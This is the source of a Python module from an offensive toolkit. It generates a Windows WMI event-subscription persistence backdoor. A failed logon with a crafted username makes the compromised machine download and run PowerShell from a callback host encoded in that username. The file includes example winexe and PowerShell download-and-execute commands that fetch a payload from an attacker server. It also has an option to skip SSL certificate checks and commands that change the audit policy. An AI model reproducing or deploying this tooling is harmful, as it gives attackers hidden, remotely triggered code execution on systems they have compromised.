#!/usr/bin/python
import sys
from support.setting import setting
from base64 import b64encode



class create:
    #define info here

    info = '''
This is the failsafe for windows persistence module.  After installing on a target, failing to login with 'FailName' perform a callback to a specified IP"

Once the payload has been generated, either copy and paste the commands into a system level powershell, or download via a powershell download and execute.

Ex:
winexe -U user%password //192.168.0.100 "powershell -c iex(New-Object Net.WebClient).DownloadString('http://192.168.0.136:8080/failsafe')"

#FAIL TO LOGIN
#After installed, fail to login with FailName@[CALLBACK_IP]    example is for 127.0.0.1
winexe -U FailName@7F000001%password //192.168.0.100

''' 
    #create a list of possible options
    option_list=["FailName","callback_port","callback_file","filter","consumer","reset_auditpol","use_ssl","output_file"]
   

    #initialize variables
     
    FailName=setting("FailName","",True,"Name to fail logon")
    filter=setting("filter","ServiceFilter",True,"name of WMI filter")   
    consumer=setting("consumer","ServiceConsumer",True,"name of WMI consumer")
    callback_port=setting("callback_port","4444",True,"Callback Port")
    callback_file=setting("callback_file","",True,"Powershell file to get after failed login")
    reset_auditpol=setting("reset_auditpol","yes",True,"Upon uninstall, reset auditpolicy to NOT log failures?")
    use_ssl=setting("use_ssl","no",True,"Set to 'yes' if you want to use SSL")
    output_file=setting("output_file","",False,"local output filename")
    
    #initialize power_beacon class
    def __init__(self):
        self.name="powerbeacon"
    def run(self) :

        FailName=self.FailName.value
        filter=self.filter.value
        consumer=self.consumer.value
        output=self.output_file.value
        callback_port=self.callback_port.value
        callback_file=self.callback_file.value
        reset_auditpol=self.reset_auditpol.value
        use_ssl=self.use_ssl.value
        
        

        if use_ssl == "no":
            messageblock = '''if(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s){$x=(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s).split('@');iex(New-Object Net.WebClient).DownloadString('http://0x'+$x[1]+':%s/%s')}''' % (FailName,FailName,callback_port,callback_file)

        else:
            messageblock = '''if(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s){$x=(wevtutil qe security /rd:true /f:text /c:1 /q:\"*[System/EventID=4625]\" | findstr /i %s).split('@');[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex(New-Object Net.WebClient).DownloadString('https://0x'+$x[1]+':%s/%s')}''' % (FailName,FailName,callback_port,callback_file)


        encodedmessage = b64encode(messageblock.encode('UTF-16LE'))

         
        data= '''
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
$instanceFilter = ([wmiclass]"\\\.\\root\subscription:__EventFilter").CreateInstance()
$instanceFilter.QueryLanguage = "WQL"
$instanceFilter.Query ="select * from __InstanceCreationEvent where TargetInstance isa 'Win32_NtLogEvent' and TargetInstance.logfile = 'Security' and (TargetInstance.EventCode = '4625')"
$instanceFilter.Name = "%s"
$instanceFilter.EventNamespace = 'root\cimv2'
$result = $instanceFilter.Put()
$newFilter = $result.Path
$instanceConsumer = ([wmiclass]"\\\.\\root\subscription:CommandLineEventConsumer").CreateInstance()
$instanceConsumer.Name = '%s'
$instanceConsumer.CommandLineTemplate  = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\powershell.exe -c "if(wevtutil qe security /rd:true /f:text /c:1 /q:`"*[System/EventID=4625]`" | findstr /i %s){powershell -e %s}"'
$result = $instanceConsumer.Put()
$newConsumer = $result.Path
$instanceBinding = ([wmiclass]"\\\.\\root\subscription:__FilterToConsumerBinding").CreateInstance()
$instanceBinding.Filter = $newFilter
$instanceBinding.Consumer = $newConsumer
$result = $instanceBinding.Put()
$newBinding = $result.Path

''' % (filter,consumer,FailName,encodedmessage)
        remove_data=''
        if reset_auditpol=="yes":
            remove_data= '''
auditpol /set /subcategory:"Logon" /success:enable /failure:disable
'''
        remove_data += '''
$x="\\\.\\root\subscription:__EventFilter.Name='%s'"
([wmi]$x).Delete() 
$x="\\\.\\root\subscription:CommandLineEventConsumer.Name='%s'"
([wmi]$x).Delete()
$x='\\\.\\root\subscription:__FilterToConsumerBinding.Consumer="\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\"%s\\"",Filter="\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\"%s\\""' 
([wmi]$x).Delete() 
''' % (filter,consumer,consumer,filter)
        if (reset_auditpol != "yes") and (reset_auditpol != "no"):         
            print "reset_auditpol must be 'yes' or 'no'"
            return 
        if (use_ssl != "yes") and (use_ssl != "no"):
            print "use_ssl must be either yes or no"
            return
        if output=='':
            print data
            print "\n"
            print "To Remove"
            print "---------------------------------"
            print remove_data
            return
        else:
            output="output/"+output
            f = open(output,'w')
            f.write(data)
            f.close()
            output=output+"_remove"
            f = open(output,'w')
            f.write(remove_data)
            f.close()
            print "Files have been written..."
            return




